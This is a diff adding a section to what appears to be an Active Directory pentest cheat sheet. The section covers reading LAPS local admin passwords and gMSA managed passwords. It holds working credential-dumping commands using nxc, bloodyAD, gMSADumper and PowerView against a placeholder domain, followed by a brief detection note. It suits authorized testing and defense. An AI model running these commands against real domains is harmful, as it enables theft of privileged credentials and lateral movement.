@@ -21,3 +21,20 @@ LAPS stores per-host local admin passwords in AD; gMSA stores a managed password
 
 ### Exhaustive commands
 ```bash
+# ── LAPS read ────────────────────────────────────────────────────────
+nxc ldap dc.corp.local -u lowpriv -p 'Password123!' -M laps
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  get object 'CN=WS01,CN=Computers,DC=corp,DC=local' --attr ms-Mcs-AdmPwd
+
+# ── gMSA read ────────────────────────────────────────────────────────
+nxc ldap dc.corp.local -u lowpriv -p 'Password123!' --gmsa
+python3 gMSADumper.py -u lowpriv -p 'Password123!' -d corp.local
+
+# ── PowerView ACL check ─────────────────────────────────────────────
+Get-DomainObjectAcl -LDAPFilter '(ms-mcs-AdmPwdExpirationTime=*)' -ResolveGUIDs
+```
+
+### Detection
+**4662** reads of `ms-Mcs-AdmPwd`/`msDS-ManagedPassword`; delegate LAPS read to a narrow group; use Windows LAPS encryption.
+
+---
